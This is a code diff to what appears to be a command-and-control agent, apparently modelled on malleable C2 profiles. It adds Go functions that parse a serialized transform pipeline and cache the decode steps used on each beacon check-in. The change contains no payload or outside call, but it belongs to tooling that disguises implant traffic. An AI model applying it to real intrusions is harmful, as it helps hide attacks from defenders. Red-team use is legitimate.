@@ -5,6 +5,7 @@ package main
 
 import (
 	"encoding/base64"
+	"strings"
 )
 
 type agentTransformFunc func([]byte) ([]byte, error)
@@ -128,6 +129,45 @@ func agentExecTransform(data []byte, step agentTransformStep, encode bool) ([]by
 		copy(out, data)
 		return out, nil
 	}
+}
+
+// parseTransformSteps parses a serialized transform pipeline (the over-the-wire
+// form of a malleable profile's output transforms). Steps are separated by ';'
+// and each step is "name" or "name:value". The order matches the server's apply
+// order; callers decode with encode=false, which reverses the order, so the
+// agent recovers the original body.
+func parseTransformSteps(s string) []agentTransformStep {
+	if s == "" {
+		return nil
+	}
+	var steps []agentTransformStep
+	for _, part := range strings.Split(s, ";") {
+		part = strings.TrimSpace(part)
+		if part == "" {
+			continue
+		}
+		if i := strings.IndexByte(part, ':'); i >= 0 {
+			steps = append(steps, agentTransformStep{Name: part[:i], Value: part[i+1:]})
+		} else {
+			steps = append(steps, agentTransformStep{Name: part})
+		}
+	}
+	return steps
+}
+
+// malleableRespDecodeSteps caches the parsed response-decode pipeline so the
+// per-beacon decode path does not re-parse the step string on every check-in.
+var malleableRespDecodeSteps []agentTransformStep
+
+// reparseMalleableTransforms re-parses the configured response-decode pipeline
+// from MalleableRespDecode. Called at init (for build-time steps) and whenever
+// an over-the-wire network config updates the steps.
+func reparseMalleableTransforms() {
+	malleableRespDecodeSteps = parseTransformSteps(MalleableRespDecode)
+}
+
+func init() {
+	reparseMalleableTransforms()
 }
 
 func agentNetBIOSEncode(data []byte) []byte {
